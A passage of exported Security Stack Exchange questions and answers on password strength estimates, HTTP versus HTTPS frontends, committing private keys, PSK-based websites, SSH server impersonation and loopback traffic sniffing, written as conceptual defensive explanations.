<p>The original password is marked by <em>zxcvbn</em> as... well not so easy to break:</p>
<p><a href=""https://i.stack.imgur.com/cvRGp.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/cvRGp.png"" alt=""enter image description here"" /></a></p>
<p>But what actually surprised me the most was finding out that removing just a single letter from the middle of this password:</p>
<blockquote>
<p><em>Moje <s>h</s>asło do Facebooka</em> → <em>Moje asło do Facebooka</em></p>
</blockquote>
<p>causes this password to be approx. 20 times easier to break (again, according to <em>zxcvbn</em>):</p>
<p><a href=""https://i.stack.imgur.com/p7T9V.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/p7T9V.png"" alt=""enter image description here"" /></a></p>
<p>Assuming that &quot;centuries&quot; means &quot;at least 2 centuries&quot;, so at least 300 years, then by getting down to 15 years (on the list item: <em>10B guesses / second; offline attack, fast hash, many cores</em>) gives us 20 times degrade on power strength, if I am not mistaken.</p>
<p>Why is that? Why removing just one letter (in this scenario or in general) makes password so easier to break?</p>
","3","3","267067","<p>Your first password <code>Moje hasło do Facebooka</code> is 24 characters in length.  Your second password <code>Moje asło do Facebooka</code> is 23 characters in length.</p>
<p>Assume that both passwords were constructed by randomly selecting characters from a set of 20 symbols.  In the first case, this was repeated 24 times, to create a random password of 24 characters in length.  In the second case, this was repeated 23 times, to create a random password 23 characters in length.</p>
<p>We use the term 'password space' to denote the number of possible passwords that can be created using this random process.</p>
<p>In the first case, the password space is 20^24 (24 characters, where each character can be one of 20 possible symbols), whereas in the second case, the password space is 20^23.  Therefore, the password space in the first case is 20 times greater than the password space in the second case, because 20^24 / 20^23 = 20.  So, the 24 character password is 20 times harder to crack than the 23 character password, because it is in a space that is 20 times larger.</p>
","4"
"267063","267063","Why removing just one letter form passwords makes it 20x easier to break according to zxcvbn test","<p>Since I am a decent fan of the <a href=""https://xkcd.com/936/"" rel=""nofollow noreferrer"">XKCD no 936</a> (or actually conclusions and implications it brings), I wanted to test (using <em><a href=""https://lowe.github.io/tryzxcvbn/"" rel=""nofollow noreferrer"">try zxcvbn</a></em>) the complexity and the possiblity of breaking a password like the following one:</p>
<blockquote>
<p>My password for Facebook</p>
</blockquote>
<p>Written in my own native language (Polish), that is:</p>
<blockquote>
<p>Moje hasło do Facebooka</p>
</blockquote>
<p>The original password is marked by <em>zxcvbn</em> as... well not so easy to break:</p>
<p><a href=""https://i.stack.imgur.com/cvRGp.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/cvRGp.png"" alt=""enter image description here"" /></a></p>
<p>But what actually surprised me the most was finding out that removing just a single letter from the middle of this password:</p>
<blockquote>
<p><em>Moje <s>h</s>asło do Facebooka</em> → <em>Moje asło do Facebooka</em></p>
</blockquote>
<p>causes this password to be approx. 20 times easier to break (again, according to <em>zxcvbn</em>):</p>
<p><a href=""https://i.stack.imgur.com/p7T9V.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/p7T9V.png"" alt=""enter image description here"" /></a></p>
<p>Assuming that &quot;centuries&quot; means &quot;at least 2 centuries&quot;, so at least 300 years, then by getting down to 15 years (on the list item: <em>10B guesses / second; offline attack, fast hash, many cores</em>) gives us 20 times degrade on power strength, if I am not mistaken.</p>
<p>Why is that? Why removing just one letter (in this scenario or in general) makes password so easier to break?</p>
","3","3","267072","<p>There are 35 letters in the Polish alphabet. If your password consists of a single lower case Polish letter, there are 35 possible passwords. If the password consists of 2 Polish letters and if these letters are chosen randomly, independent on each other, there are 35 possible letters on the 1st place and for each of them there are 35 possible letters on the 2nd place. Thus there are 35 x 35 possible passwords. To check all of them, you need 35 times more time than to check a password that consists of a single letter. Thus, adding a letter to password increases the number of possible passwords in 35 times. Means, an attacker will need 35 times more time to check all possible passwords.</p>
<p>This works also vice versa. If you have some password and make it shorter by one letter, the attacker will need 35 times less time to check all of them.</p>
<p>If you use lower and upper case, there are actually 35 x 2 = 70 possible letters on each position. If you use space character, there are 71 possible letters on each position. Adding or removing a single character in such case increases or reduces the brute-forcing time in 71 times.</p>
","2"
"267063","267063","Why removing just one letter form passwords makes it 20x easier to break according to zxcvbn test","<p>Since I am a decent fan of the <a href=""https://xkcd.com/936/"" rel=""nofollow noreferrer"">XKCD no 936</a> (or actually conclusions and implications it brings), I wanted to test (using <em><a href=""https://lowe.github.io/tryzxcvbn/"" rel=""nofollow noreferrer"">try zxcvbn</a></em>) the complexity and the possiblity of breaking a password like the following one:</p>
<blockquote>
<p>My password for Facebook</p>
</blockquote>
<p>Written in my own native language (Polish), that is:</p>
<blockquote>
<p>Moje hasło do Facebooka</p>
</blockquote>
<p>The original password is marked by <em>zxcvbn</em> as... well not so easy to break:</p>
<p><a href=""https://i.stack.imgur.com/cvRGp.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/cvRGp.png"" alt=""enter image description here"" /></a></p>
<p>But what actually surprised me the most was finding out that removing just a single letter from the middle of this password:</p>
<blockquote>
<p><em>Moje <s>h</s>asło do Facebooka</em> → <em>Moje asło do Facebooka</em></p>
</blockquote>
<p>causes this password to be approx. 20 times easier to break (again, according to <em>zxcvbn</em>):</p>
<p><a href=""https://i.stack.imgur.com/p7T9V.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/p7T9V.png"" alt=""enter image description here"" /></a></p>
<p>Assuming that &quot;centuries&quot; means &quot;at least 2 centuries&quot;, so at least 300 years, then by getting down to 15 years (on the list item: <em>10B guesses / second; offline attack, fast hash, many cores</em>) gives us 20 times degrade on power strength, if I am not mistaken.</p>
<p>Why is that? Why removing just one letter (in this scenario or in general) makes password so easier to break?</p>
","3","3","267084","<p>The password entropy calculation from this tool is not very accurate and is generating values I consider to be too high. That said, removing a character from a pass<em>code</em> will reduce its complexity by the number of iterations that character represents. Assuming the <a href=""https://en.wikipedia.org/wiki/Polish_alphabet"" rel=""nofollow noreferrer"">Polish alphabet</a>'s 32 letters (or 35 if including <code>q</code>, <code>v</code>, and <code>x</code>), your shorter password would make the password 32x (or 35x) easier to break, <em>at least when missing the fact that this is a pass<em>phrase</em> composed of words</em>.</p>
<p><strong>Password complexity detection tools are all wrong.</strong></p>
<p>Password complexity cannot be calculated without knowing the formula used to create the password. Guessing that formula can be disastrous, as you have experienced with this tool.</p>
<p>Your <code>Moje hasło do Facebooka</code> password appears to use a formula of &quot;four Polish words&quot;. This is not a good formula. When composing a passphrase, you must ensure that the words are randomly generated and not related to each other. &quot;My password for Facebook&quot; is a sensible sentence, so it is not a good password. (See also the <a href=""https://security.stackexchange.com/q/6095/42391"" title=""XKCD #936: Short complex password, or long dictionary passphrase?"">infosec.SE analysis xkcd 936</a> for <code>correct horse battery staple</code>.)</p>
<p><strong>If your password, quoted, might have hits in a Google search, it is not secure.</strong><br />
(This is an intellectual exercise; don't share potential passwords with a search engine.)</p>
<p>Let's instead assume your password was <code>Poprawny koń zszywka bateria</code>. The first thing you'll notice is that I translated each word separately rather than properly conjugating it as &quot;Prawidłowa bateria zszywek dla koni&quot;. This is because the words must not be related to each other. In languages with grammatical gender, this might be a little confusing, but it's important because otherwise you're losing entropy. This is also why the English passphrase isn't &quot;Correct horses staple batteries&quot; or something else that's more of a sentence (the plural &quot;horses&quot; implies a plural for &quot;batteries&quot;).</p>
<p>The complexity of this comes from the size of the dictionary. If you're using a standard English spelling dictionary, that's 100k. The Polish dictionary I just downloaded has 4000k, though that might be implausible; I just auto-generated a passphrase of <code>ontologi trzebieszowskie niefortecznej nielitogeniczną</code>, which seems like quite a mouthful.</p>
<p>There's a password-generation system called <a href=""https://en.wikipedia.org/wiki/Diceware"" rel=""nofollow noreferrer"">diceware</a>, which has its own <a href=""https://web.archive.org/web/20130420042549/http://drfugazi.eu.org/sites/drfugazi.eu.org/files/dicelist-pl.txt"" rel=""nofollow noreferrer"">Polish diceware word list</a> you could use. Example passphrase: <code>plewka szpieg raban pruski ibi</code>.</p>
<p>Diceware has a 7776-word dictionary, so a four-word diceware passphrase has an entropy of log₂(7776⁴) = 51.</p>
<p>This tool seems to ignore standard entropy measurement in bits truncated to an integer and instead measures in base 10, so log₁₀(7776⁴) = 15.56303.</p>
<p>Reducing a passphrase like <code>plewka szpieg raban pruski ibi</code> down to <code>plewka zpieg raban pruski ibi</code> actually <em>increases</em> its complexity since <code>zpieg</code> is not a word. In <a href=""https://security.stackexchange.com/a/93628/42391"">my own entropy calculations</a>, I multiply words by six for typos/misspellings or iterations like l33t speak, so the entropy goes <em>up</em> by a little, from log₂(7776⁵) = 64 to log₂(7776⁵×6×5) = 69 assuming the attacker knows you've varied one word but not which one.</p>
<p>(<strong>Always assume attackers know your formula.</strong> Hopefully, they don't and will therefore take far longer to break your password, but calculating complexity needs to assume the worst-case scenario or else you're just hiding in presumed obscurity.)</p>
","8"
"266858","266858","POST over HTTP: Is it ever safe to post sensitive information?","<p>I know HTTP is insecure because the data transmitted is not encrypted.</p>
<p>I made a web application, however, that the frontend and backend are hosted on different servers. The backend itself is configured with HTTPS, but the frontend is not yet (so only HTTP). Every request I make to the backend is made using the HTTPS server.</p>
<p>So this got me thinking: <strong>If my &quot;insecure&quot; frontend only uses the sensitive data to make requests to an HTTPS server, doesn't it make my application secure?</strong> Because the sensitive data is not transmitted in anyway to the frontend HTTP server, it is merely a static webpage.</p>
<p>And on the other hand, if the situation was reversed: being HTTPS configured on my frontend (thus, it appears as a secure application on the user side, on the browser), but the API endpoints are HTTP. Doesn't it make the application insecure, even though it is an HTTPS website? Because sensitive data would be transmitted to eg <code>http://myinsecureapi.doamin.com</code>.</p>
","1","3","266860","<p>The rule is that if a service is accessible from uncontroled clients, then that service should be protected by SSL. It does not matter whether well behaving clients use it. What matters is whether they <em>could</em> use it. So if your backend server is publicly accessible, then it should only respond to HTTPS queries when they come from the outside.</p>
<p>That being said, a common configuration is to setup a HTTPS (reverse) proxy (or a farm of proxy servers) that are the only end points publicly accessible. Those proxys then relay the requests and responses to/from the real servers that should be securely hidden behind a firewall. In that case, the real servers could serve HTTP requests without any security problem: all data exchanges occur in a trusted zone. Of course this only make sense when those servers are inside a trusted datacenter, but it is common for companies having private datacenters. Said differently, this should be avoided if the services are hosted on public clouds...</p>
","1"
"266858","266858","POST over HTTP: Is it ever safe to post sensitive information?","<p>I know HTTP is insecure because the data transmitted is not encrypted.</p>
<p>I made a web application, however, that the frontend and backend are hosted on different servers. The backend itself is configured with HTTPS, but the frontend is not yet (so only HTTP). Every request I make to the backend is made using the HTTPS server.</p>
<p>So this got me thinking: <strong>If my &quot;insecure&quot; frontend only uses the sensitive data to make requests to an HTTPS server, doesn't it make my application secure?</strong> Because the sensitive data is not transmitted in anyway to the frontend HTTP server, it is merely a static webpage.</p>
<p>And on the other hand, if the situation was reversed: being HTTPS configured on my frontend (thus, it appears as a secure application on the user side, on the browser), but the API endpoints are HTTP. Doesn't it make the application insecure, even though it is an HTTPS website? Because sensitive data would be transmitted to eg <code>http://myinsecureapi.doamin.com</code>.</p>
","1","3","266861","<p>When serving interactive content over unencrypted HTTP, nothing prevents the interactive content being tampered with. For example, a HTML form could be manipulated to POST the content to an entirely different server, rather than to your HTTPS backend.</p>
<p>Thus, for your web application as a whole to be secure, you must also serve the frontend over HTTPS. Ensuring integrity is most important for HTML and JavaScript resources. However, more passive resources such as CSS styles, fonts, images, and videos could still be used to mislead the user.</p>
<p>Note that modern browsers have various defense mechanisms against using unencrypted connections. By now, all mainstream browsers will show a warning when using an unencrypted website. My browser is configured to use a HTTPS-only mode, and will not load HTTP sites without explicit confirmation. Some browser features are only available in secure contexts. Cross-origin requests are somewhat restricted anyways. Your reversed example (HTTPS frontend interacting with HTTP API) would likely be blocked by the browser's policy against <a href=""https://web.dev/what-is-mixed-content/"" rel=""nofollow noreferrer"">mixed content</a> (<a href=""https://w3c.github.io/webappsec-mixed-content/#requirements-forms"" rel=""nofollow noreferrer"">possibly also for normal form submission</a>).</p>
","3"
"266858","266858","POST over HTTP: Is it ever safe to post sensitive information?","<p>I know HTTP is insecure because the data transmitted is not encrypted.</p>
<p>I made a web application, however, that the frontend and backend are hosted on different servers. The backend itself is configured with HTTPS, but the frontend is not yet (so only HTTP). Every request I make to the backend is made using the HTTPS server.</p>
<p>So this got me thinking: <strong>If my &quot;insecure&quot; frontend only uses the sensitive data to make requests to an HTTPS server, doesn't it make my application secure?</strong> Because the sensitive data is not transmitted in anyway to the frontend HTTP server, it is merely a static webpage.</p>
<p>And on the other hand, if the situation was reversed: being HTTPS configured on my frontend (thus, it appears as a secure application on the user side, on the browser), but the API endpoints are HTTP. Doesn't it make the application insecure, even though it is an HTTPS website? Because sensitive data would be transmitted to eg <code>http://myinsecureapi.doamin.com</code>.</p>
","1","3","266874","<p><em>A rule we all have to remember:</em></p>
<hr />
<p>HTTP <strong>POST</strong> method is mandatory for transmitting <em>sensitive</em> information (eg. passwords, social security numbers...) with HTML forms.
When <strong>GET</strong> is used, form parameters key=values pairs are apppened in response URI, thus creating information disclosure in client browser URI bar, but also in client/server logs.</p>
<hr />
<p><em>Encryption is not enough...</em></p>
<hr />
<p>In your application, <em>Static pages</em> and related client browser could still be vunerable to other kind of attacks, mainly related to <strong>injection</strong> of browser interpretable content, for example browser scripts with XSS, HTML/CSS code...Be aware that those vulnerabilities could be merged together to create more sophisticated attack scenarios.</p>
<hr />
<p><em>But Mandatory.</em></p>
<hr />
<p>Regardless of services types, <strong>services must only provide HTTPS endpoints</strong> with corectly configured cipher suites. Your second tough &quot;API endpoints are HTTP&quot; causes a number of problems: it could expose authentication credentials in transit, for example API keys, passwords or JSON Web Tokens. Clients have no protocol handled way of authentication with the service (since you are not using IETF HTTP Authentication mecanisims for this purpose) and the service does not guarantees integrity of the transmitted data.</p>
<p>Consider also the use of mutually authenticated client-side certificates to provide additional protection for a highly privileged web APi.</p>
","3"
"266834","266834","Is it safe to check-in a RSA private key?","<p>As far as I know, it is bad to check-in something like a password in a version control system. However, I saw in a project that a <code>private_key.pem</code> file with <code>-----BEGIN RSA PRIVATE KEY----- ...</code> content is checked in. For me this smells like a security issue.</p>
<p>Is it a security issue?</p>
","1","3","266836","<blockquote>
<p>Is it a security issue?</p>
</blockquote>
<p>It depends on the impact of a key compromise and the probability of the compromise.</p>
<ul>
<li>If this is only some unimportant key (like only used for testing), then this is not a problem.</li>
<li>If this is a private repository only accessible to the few trusted users which also need access to the key, then this usually not a problem. Note that a repository in the cloud hosted by some service provider might not fit <em>&quot;only accessible to the few trusted users which also need access to the key&quot;</em> since also the service provider can access it. And note that the probability of a key compromise increases with the number of users which have access to the key.</li>
<li>If this is a sensitive key in a public repository, then this is definitely a problem.</li>
</ul>
","1"
"266834","266834","Is it safe to check-in a RSA private key?","<p>As far as I know, it is bad to check-in something like a password in a version control system. However, I saw in a project that a <code>private_key.pem</code> file with <code>-----BEGIN RSA PRIVATE KEY----- ...</code> content is checked in. For me this smells like a security issue.</p>
<p>Is it a security issue?</p>
","1","3","266845","<p>Access codes, credentials, crypto keys and everything else may be stored in a source/version control system for management facilitation and lifecycle monitoring reasons. It's not <em>the stored info</em> that makes the difference, but <em>who</em> has access to it and <em>why</em>.</p>
<p>So, if the repo you were looking at (that has the private key) is e.g. one that stores ansible playbooks or kubernetes tls secrets, then it should be expected to find keys in it. It's also expected that access to that repo should only be granted to people whose job is to work with these things (e.g. infrastructure).</p>
<p>If, on the other hand, the repo stores e.g. your code base, to which access is granted to several software developers, then the key should not be there.</p>
<blockquote>
<p>Is it a security issue?</p>
</blockquote>
<p>Yes, if unauthorized people have access to it. No, otherwise*.</p>
<hr />
<p>*Insider threats (e.g. authorized personnel abusing their authority or have their credentials stolen) are always a problem - this does not mean that you never store sensitive or critical information to a version control system or never give access to anyone; you have to trust the correct people at some point</p>
","0"
"266834","266834","Is it safe to check-in a RSA private key?","<p>As far as I know, it is bad to check-in something like a password in a version control system. However, I saw in a project that a <code>private_key.pem</code> file with <code>-----BEGIN RSA PRIVATE KEY----- ...</code> content is checked in. For me this smells like a security issue.</p>
<p>Is it a security issue?</p>
","1","3","266848","<p>It is sometimes necessary to carry <strong>secrets</strong>, that includes passwords and client certificates - think about (unattended) embedded device projects. Although it may be preferable to supply sensitive configuration files separately, for example deploying them using tools like Ansible, or flashing NVRAM etc.</p>
<p>That can be done at the time of <strong>provisioning the device</strong> and possibly <strong>customized per device</strong>, whereas the project code is otherwise standard and identical on all devices.</p>
<p>So, this is not necessarily a big issue, as long as the repo remains &quot;private&quot;. What is important here is that the private key may not be reused for another purpose, like logging in to your corporate infrastructure via SSH.</p>
<p>Also, it may be good to have one private key per client, so that if a key is compromised it can be <strong>revoked</strong> without affected the other enrolled clients. Takes a bit more effort and organization but easily automated.</p>
","1"
"266801","266801","How to build a PSK website","<p>Pre-Shared Key (PSK) with simple symmetric encryption is a popular way of solving both client and server authentication when SSL cannot be used for some reason (for example, can't trust or deal with certificate management, or even <a href=""https://security.stackexchange.com/questions/37655/build-a-secure-channel-without-ssl-tls"">SSL not supported on the server</a>). And PSK has the advantage of not requiring a complex negotiation protocol. So how can a website use PSK for connection security?</p>
<p>It appears that browsers do not have built-in PSK. Going through an SSH tunnel may not be an option either (first, the SSH server fingerprint is harder to remember than a user-generated PSK password; second, SSH tunnels <a href=""https://security.stackexchange.com/questions/266786/how-can-non-root-intercept-privileged-loopback-ports"">do not solve Chrome's unsettling warnings about plain HTTP</a>; and third, the server might not support SSH).</p>
<p>So, is there some generic browser add-on that prompts for URL + PSK, and visits any (PSK-enabled) site using PSK encryption? &quot;Browser add-on&quot; could be pretty much anything. (For example, a script loaded via <code>file://</code> that establishes a secure PSK connection inside a cross-site WebSocket, patches all resource-loading methods in JavaScript to PSK versions, and, finally, securely loads and executes the top javascript file.)</p>
<p>If not, please provide possible reasons why such a feature is not standardized.</p>
","2","3","266802","<blockquote>
<p>So, is there some generic browser add-on that prompts for URL + PSK, and visits any site using PSK encryption?</p>
</blockquote>
<p>To achieve such end-to-end protection changes would need to be done to the way how client and server communicate with each other. In order to implement such changes on the communication protocol there would need to be changes both on the client and on the server side.</p>
<p>Therefore there cannot be a solution which end-to-end protects communication with arbitrary web sites, but which is client-side only (like browser add-on, proxy...).</p>
<p>If it is about accessing a site which is somehow already PSK enabled (I'm not aware of major web servers supporting such thing), then a local HTTP proxy could be implemented to provide such functionality. It would speak to the server with PSK and to the client with HTTPS, using certificates created dynamically by its own CA which has to be added as trusted to the browser so that the browser throws no warnings.</p>
<blockquote>
<p>If not, please provide possible reasons why such a feature is not standardized.</p>
</blockquote>
<p>Using PSK has the same problem as self-signed certificates: it does not scale. Like with self-signed certificates, pre-shared keys would require a mechanism to somehow distribute the shared keys using some trusted mechanism, before a trustable connection with the peer could be established. And a mechanism for revocation of shared keys too in case these got compromised would be required too.</p>
<p>Using PSK based authentication on scale is actually not simpler than certificate based authentication with trusted CA. There need to be some mechanism for handling the trust relationships (i.e. distributing shared keys on scale). PSK presumes such mechanism but does not define it, whereas certificate based authentication actually defines and implements it.</p>
<p>In addition PSK would either require a separate shared secret between each user and the website - which means many many secrets to maintain on the server site. Or it would require the secret to be shared between all users of the site, which could then not be called a secret anymore.</p>
","3"
"266801","266801","How to build a PSK website","<p>Pre-Shared Key (PSK) with simple symmetric encryption is a popular way of solving both client and server authentication when SSL cannot be used for some reason (for example, can't trust or deal with certificate management, or even <a href=""https://security.stackexchange.com/questions/37655/build-a-secure-channel-without-ssl-tls"">SSL not supported on the server</a>). And PSK has the advantage of not requiring a complex negotiation protocol. So how can a website use PSK for connection security?</p>
<p>It appears that browsers do not have built-in PSK. Going through an SSH tunnel may not be an option either (first, the SSH server fingerprint is harder to remember than a user-generated PSK password; second, SSH tunnels <a href=""https://security.stackexchange.com/questions/266786/how-can-non-root-intercept-privileged-loopback-ports"">do not solve Chrome's unsettling warnings about plain HTTP</a>; and third, the server might not support SSH).</p>
<p>So, is there some generic browser add-on that prompts for URL + PSK, and visits any (PSK-enabled) site using PSK encryption? &quot;Browser add-on&quot; could be pretty much anything. (For example, a script loaded via <code>file://</code> that establishes a secure PSK connection inside a cross-site WebSocket, patches all resource-loading methods in JavaScript to PSK versions, and, finally, securely loads and executes the top javascript file.)</p>
<p>If not, please provide possible reasons why such a feature is not standardized.</p>
","2","3","266806","<p>A PSK-secured website does not make much sense, it's difficult to create and maintain, and does not add any security over what TLS already have. PSK on a server-to-server communication is viable and easily done, but PSK involving user entering data over a plain HTTP connection is not.</p>
<p>If you have a server so resource constrained that you cannot run TLS on it, it cannot be called a server. Even single board modules like ESP8266 <a href=""https://arduino-esp8266.readthedocs.io/en/latest/esp8266wifi/bearssl-client-secure-class.html"" rel=""nofollow noreferrer"">have TLS support</a>. Someone even managed to run TLS over HTTP (so no proper HTTPS, but quite close) on an Arduino. So &quot;limited server that does not support TLS&quot; isn't a likely scenario.</p>
<p>If SSL cannot be trusted, there's little left that can be trusted. Certificate management is not trivial, but managing any server that is important enough to have some kind of security is more difficult than that. So it's not a likely scenario either.</p>
<p>If you don't have TLS, PSK does not make sense. Any attacker on the path could read the packets on the wire to get the PSK, or inject a script to get the PSK on the page and send to him, or redirect the user to a site he controls and ask the PSK there. Without TLS protecting the connection, the user cannot tell the attack is taking place (except the last one).</p>
<p>If you do have TLS, PSK is not needed. I would trust more a TLS connection that uses a library that is trusted for decades by banks, government and military more than any plugin, script or extension someone wrote.</p>
<p>One scenario that is possible, plausible and likely is when the user is behind a <a href=""https://en.wikipedia.org/wiki/TLS_termination_proxy"" rel=""nofollow noreferrer"">TLS Termination Proxy</a>. In those cases, the TLS connection is not entirely under user and server control, and there's a server in the middle between the two. In those cases, the proxy can read everything and alter everything on the connection. If this proxy is hostile, TLS cannot be trusted.</p>
<p>But in this scenario, PSK over this connection cannot be trusted either. The proxy is in position and have the capabilities to inspect and alter any packet, so it could inject a token stealing script, could record the token after being entered, or could inject a script to ask for the token on any site.</p>
","0"
"266801","266801","How to build a PSK website","<p>Pre-Shared Key (PSK) with simple symmetric encryption is a popular way of solving both client and server authentication when SSL cannot be used for some reason (for example, can't trust or deal with certificate management, or even <a href=""https://security.stackexchange.com/questions/37655/build-a-secure-channel-without-ssl-tls"">SSL not supported on the server</a>). And PSK has the advantage of not requiring a complex negotiation protocol. So how can a website use PSK for connection security?</p>
<p>It appears that browsers do not have built-in PSK. Going through an SSH tunnel may not be an option either (first, the SSH server fingerprint is harder to remember than a user-generated PSK password; second, SSH tunnels <a href=""https://security.stackexchange.com/questions/266786/how-can-non-root-intercept-privileged-loopback-ports"">do not solve Chrome's unsettling warnings about plain HTTP</a>; and third, the server might not support SSH).</p>
<p>So, is there some generic browser add-on that prompts for URL + PSK, and visits any (PSK-enabled) site using PSK encryption? &quot;Browser add-on&quot; could be pretty much anything. (For example, a script loaded via <code>file://</code> that establishes a secure PSK connection inside a cross-site WebSocket, patches all resource-loading methods in JavaScript to PSK versions, and, finally, securely loads and executes the top javascript file.)</p>
<p>If not, please provide possible reasons why such a feature is not standardized.</p>
","2","3","266831","<p>TLS is widely adopted because of all the known reasons:</p>
<ul>
<li>well established protocol that has stood the test of time</li>
<li>uses asymmetric cryptography for key management and distribution</li>
<li>provides (server or mutual) authentication</li>
<li>provides forward secrecy</li>
<li>etc.</li>
</ul>
<p>All those reasons, and more, are well known and understood. So, it's safe to say that due to the wide adoption of TLS on the web, (web) <a href=""https://crypto.stackexchange.com/a/68568"">servers opt to support it over any other non-mainstream solution</a> (the IoT world <em>may</em> change that - it remains to be seen).</p>
<p>Having said that, there's the solution to use <a href=""https://en.wikipedia.org/wiki/TLS-PSK"" rel=""nofollow noreferrer"">TLS-PSK</a>, which essentially uses <a href=""https://datatracker.ietf.org/doc/html/rfc4279"" rel=""nofollow noreferrer"">ciphers with pre-shared keys</a> (note that there's some differences between TLSv1.2 and v1.3). I'm not sure how common it is, though, so finding documentation on how to use it in your case may prove to be difficult.</p>
","1"
"266797","266797","Can an SSH server in password mode be impersonated if I ignore the fingerprint warning?","<p>Assume that I never check the server fingerprint when logging in to an SSH server. This means that certain configurations of SSH can be impersonated. For example, I can log into a server that only has my public key. Obviously this doesn't authenticate the server.</p>
<p>But now suppose that SSH uses a private password. I am not familiar with the internals of SSH, but I would hope that the password challenge goes in both directions <em>when both sides share the same common secret</em>.  Therefore, if I enter my password and the client allows the connection, then it has authenticated the server. Is this reasoning correct?</p>
<p>Or is there still some way for someone without my password to impersonate the server?</p>
","8","3","266798","<blockquote>
<p>... if I enter my password and the client allows the connection, then it has authenticated the server.</p>
</blockquote>
<p>Neither password based nor key based authentication of the client against the server will somehow authenticate the server. This is also true if the client's private key is protected by a password: the password will only be used locally on the client to use the private key on the client, but has nothing to do with successful or unsuccessful server authentication.</p>
<p>In other words: not properly authenticating the server opens you up to server impersonation or man in the middle attacks, no matter which client authentication method is used.</p>
<blockquote>
<p>... a private password. I am not familiar with the internals of SSH, but I would hope that the password challenge goes in both directions when both sides share the same common secret.</p>
</blockquote>
<p>That's not how password authentication in SSH works. With password authentication the server simply gets the password from the client and then checks it against the local (to server) authentication mechanism. Typically the password is not even known server side for checking it, but only a password hash is known. And maybe not even this, because the server might use an authentication backend like <a href=""https://en.wikipedia.org/wiki/Pluggable_authentication_module"" rel=""noreferrer"">PAM</a>, LDAP or Radius.</p>
<p>So when the client does not properly authenticate the server in this case, then the wrong server (attacker) might end up with the client's password and can use it against the real server.</p>
<p>A real shared common secret would be <a href=""https://en.wikipedia.org/wiki/Pre-shared_key"" rel=""noreferrer"">Pre-Shared Key</a>, as known from WPA-PSK, IPSec or PSK authentication in TLS. In this mode the authentication can only succeed if both client and server know the same secret, but without some man in the middle able to sniff the secret. But PSK based authentication is not defined for SSH.</p>
","22"
"266797","266797","Can an SSH server in password mode be impersonated if I ignore the fingerprint warning?","<p>Assume that I never check the server fingerprint when logging in to an SSH server. This means that certain configurations of SSH can be impersonated. For example, I can log into a server that only has my public key. Obviously this doesn't authenticate the server.</p>
<p>But now suppose that SSH uses a private password. I am not familiar with the internals of SSH, but I would hope that the password challenge goes in both directions <em>when both sides share the same common secret</em>.  Therefore, if I enter my password and the client allows the connection, then it has authenticated the server. Is this reasoning correct?</p>
<p>Or is there still some way for someone without my password to impersonate the server?</p>
","8","3","266799","<p>According to <a href=""https://www.digitalocean.com/community/tutorials/understanding-the-ssh-encryption-and-connection-process"" rel=""nofollow noreferrer"">this site</a>:</p>
<blockquote>
<p>The general method is password authentication, which is when the
server prompts the client for the password of the account they are
attempting to log in with. <strong>The password is sent</strong> through the negotiated
encryption, so it is secure from outside parties.</p>
</blockquote>
<p>(emphasis on &quot;the password is sent&quot; is mine).</p>
<p>Which suggests that <em>the password itself</em> (or a fixed hash of it) is sent <em>to the server</em>. Not(??!!) hashed with session nonce first.</p>
<p>Given its popularity, it's hard to believe that SSH relies entirely on the fingerprint mechanism to authenticate the server, when it's obvious how to improve on that without changing how it's used. I'm hoping there will be a better answer.</p>
","3"
"266797","266797","Can an SSH server in password mode be impersonated if I ignore the fingerprint warning?","<p>Assume that I never check the server fingerprint when logging in to an SSH server. This means that certain configurations of SSH can be impersonated. For example, I can log into a server that only has my public key. Obviously this doesn't authenticate the server.</p>
<p>But now suppose that SSH uses a private password. I am not familiar with the internals of SSH, but I would hope that the password challenge goes in both directions <em>when both sides share the same common secret</em>.  Therefore, if I enter my password and the client allows the connection, then it has authenticated the server. Is this reasoning correct?</p>
<p>Or is there still some way for someone without my password to impersonate the server?</p>
","8","3","266800","<p>Your question seems to revolve around the idea of mutual authentication between an SSH client and SSH server based on a password.  Protocols like PAKE and <a href=""https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol"" rel=""noreferrer"">SRP</a> aim to solve this problem.  With PAKE/SRP, the client and the server mutually authenticate one another based on a password known to the client (and a derivation of the password known to the server).  At the end of the process, the client and the server share a shared secret, which can then be used to create a secure transport layer between the client and the server.  PAKE and SRP offer other benefits as well.  See <a href=""https://security.stackexchange.com/questions/242811/alternatives-for-sending-plaintext-password-while-login"">Alternatives for sending plaintext password while login</a> for more info.</p>
<p>But, I am not aware of any SSH implementations that incorporate PAKE or SRP.  SSH generally works differently.  First, a secure transport layer between the client and the server is built (e.g. as per <a href=""https://www.rfc-editor.org/rfc/rfc5656"" rel=""noreferrer"">RFC 5656</a>).  The client can optionally authenticate the server during this phase of the process (see section 4 of RFC 5656).  Then, once the secure transport layer is in place, the client can then optionally authenticate with the server (e.g. as per <a href=""https://www.rfc-editor.org/rfc/rfc4252"" rel=""noreferrer"">RFC 4252</a>), using any one of several possible methods (e.g. public key authentication, password authentication, etc).</p>
","9"
"266786","266786","How can non-root intercept privileged loopback ports?","<p>Please walk through how an attacker can intercept Chrome's connection to 127.0.0.1:999, as suggested by the warning below.</p>
<p><a href=""https://i.stack.imgur.com/caSnP.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/caSnP.png"" alt=""enter image description here"" /></a></p>
<p>This warning is consitently displayed across many versions of Chrome in many OSes.</p>
<p>When I click the &quot;learn more&quot; link in the message, it says that SSL would be more secure, implying that an attacker can intercept Chrome's connection to 127.0.0.1:999. It is established that <a href=""https://security.stackexchange.com/a/215472/286296"">any user can open a port on 127.0.0.1</a>. However, according to w3.org, <a href=""https://www.w3.org/Daemon/User/Installation/PrivilegedPorts.html"" rel=""noreferrer"">only root can open port numbers below 1024</a>. In light of this, how does the attacker pull off the interception in this case?</p>
","6","4","266787","<p>While for listening a port&lt;=1024 usually root privileges are needed, sniffing the traffic on this port might still be possible. But sniffing traffic is all what is needed in order to extract sensitive information like passwords from unprotected (plain HTTP) traffic.</p>
<p>It is not uncommon that non-root users are given the permissions to run tcpdump or similar sniffers for example using sudo, because this is needed as part of their work.</p>
","4"
